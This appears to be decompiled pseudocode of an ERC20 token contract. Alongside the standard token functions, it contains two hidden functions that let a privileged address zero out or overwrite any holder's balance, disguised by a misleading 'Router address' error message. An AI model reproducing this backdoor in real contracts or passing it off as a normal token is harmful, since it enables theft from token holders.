contract main {




// =====================  Runtime code  =====================


address owner;
array of struct stor3;
array of struct stor4;
uint8 decimals;
uint256 sub_fa977169;
uint256 sub_e033da2a;
uint256 totalSupply;
uint256 stor9;
mapping of uint8 stor11;
address stor12;
mapping of uint256 allowed;
mapping of uint256 balances;

function allowAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor11[arg1])
}

function totalSupply() payable {
    return totalSupply
}

function balances(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balances[arg1]
}

function decimals() payable {
    return decimals
}

function allowed(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowed[arg1][arg2]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balances[address(arg1)]
}

function owner() payable {
    return owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowed[address(arg1)][address(arg2)]
}

function sub_e033da2a(?) payable {
    return sub_e033da2a
}

function sub_fa977169(?) payable {
    return sub_fa977169
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    allowed[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_9a1e3cec(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if stor12 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: cannot permit Router address'
    balances[address(arg1)] = 0
}

function sub_62ad0852(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if stor12 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: cannot permit Router address'
    balances[address(arg1)] = stor9
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require arg1
    require arg2 <= balances[address(msg.sender)]
    if stor11[address(msg.sender)]:
        if arg2 > balances[address(msg.sender)]:
            revert with 'NH{q', 1
        else:
            if balances[address(msg.sender)] < arg2:
                revert with 'NH{q', 17
            else:
                balances[address(msg.sender)] -= arg2
                if balances[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                else:
                    if balances[address(arg1)] + arg2 < balances[address(arg1)]:
                        revert with 'NH{q', 1
                    else:
                        balances[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
    else:
        if not stor11[address(arg1)]:
            if arg2 > balances[address(msg.sender)]:
                revert with 'NH{q', 1
            else:
                if balances[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                else:
                    balances[address(msg.sender)] -= arg2
                    if balances[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    else:
                        if balances[address(arg1)] + arg2 < balances[address(arg1)]:
                            revert with 'NH{q', 1
                        else:
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
        else:
            if arg2 > balances[address(msg.sender)]:
                revert with 'NH{q', 1
            else:
                if balances[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                else:
                    balances[address(msg.sender)] -= arg2
                    if balances[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    else:
                        if balances[address(arg1)] + arg2 < balances[address(arg1)]:
                            revert with 'NH{q', 1
                        else:
                            balances[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
}

function name() payable {
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor3.length):
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        else:
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
        if ceil32(stor3.length.field_1) > stor3.length.field_1:
            mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
    if bool(stor3.length) == stor3.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    else:
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
    if ceil32(stor3.length.field_1) > stor3.length.field_1:
        mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
    return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowed[address(arg1)][address(msg.sender)]
    if stor11[address(arg1)]:
        if arg3 > balances[address(arg1)]:
            revert with 'NH{q', 1
        else:
            if balances[address(arg1)] < arg3:
                revert with 'NH{q', 17
            else:
                balances[address(arg1)] -= arg3
                if balances[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                else:
                    if balances[address(arg2)] + arg3 < balances[address(arg2)]:
                        revert with 'NH{q', 1
                    else:
                        balances[address(arg2)] += arg3
                        if arg3 > allowed[address(arg1)][address(msg.sender)]:
                            revert with 'NH{q', 1
                        else:
                            if allowed[address(arg1)][address(msg.sender)] < arg3:
                                revert with 'NH{q', 17
                            else:
                                allowed[address(arg1)][address(msg.sender)] -= arg3
                                emit Transfer(arg3, arg1, arg2);
                                return 1
    else:
        if not stor11[address(arg2)]:
            if arg3 > balances[address(arg1)]:
                revert with 'NH{q', 1
            else:
                if balances[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                else:
                    balances[address(arg1)] -= arg3
                    if balances[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    else:
                        if balances[address(arg2)] + arg3 < balances[address(arg2)]:
                            revert with 'NH{q', 1
                        else:
                            balances[address(arg2)] += arg3
                            if arg3 > allowed[address(arg1)][address(msg.sender)]:
                                revert with 'NH{q', 1
                            else:
                                if allowed[address(arg1)][address(msg.sender)] < arg3:
                                    revert with 'NH{q', 17
                                else:
                                    allowed[address(arg1)][address(msg.sender)] -= arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    return 1
        else:
            if arg3 > balances[address(arg1)]:
                revert with 'NH{q', 1
            else:
                if balances[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                else:
                    balances[address(arg1)] -= arg3
                    if balances[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    else:
                        if balances[address(arg2)] + arg3 < balances[address(arg2)]:
                            revert with 'NH{q', 1
                        else:
                            balances[address(arg2)] += arg3
                            if arg3 > allowed[address(arg1)][address(msg.sender)]:
                                revert with 'NH{q', 1
                            else:
                                if allowed[address(arg1)][address(msg.sender)] < arg3:
                                    revert with 'NH{q', 17
                                else:
                                    allowed[address(arg1)][address(msg.sender)] -= arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    return 1
}

function symbol() payable {
    if bool(stor4.length):
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor4.length):
            if bool(stor4.length) == stor4.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor4.length.field_1:
                if 31 < stor4.length.field_1:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while stor4.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
                mem[128] = 256 * stor4.length.field_8
        else:
            if bool(stor4.length) == stor4.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor4.length.field_1:
                if 31 < stor4.length.field_1:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while stor4.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
                mem[128] = 256 * stor4.length.field_8
        mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
        if ceil32(stor4.length.field_1) > stor4.length.field_1:
            mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
    if bool(stor4.length) == stor4.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor4.length):
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor4.length.field_1:
            if 31 < stor4.length.field_1:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while stor4.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    else:
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor4.length.field_1:
            if 31 < stor4.length.field_1:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while stor4.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
    if ceil32(stor4.length.field_1) > stor4.length.field_1:
        mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
    return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
}



}
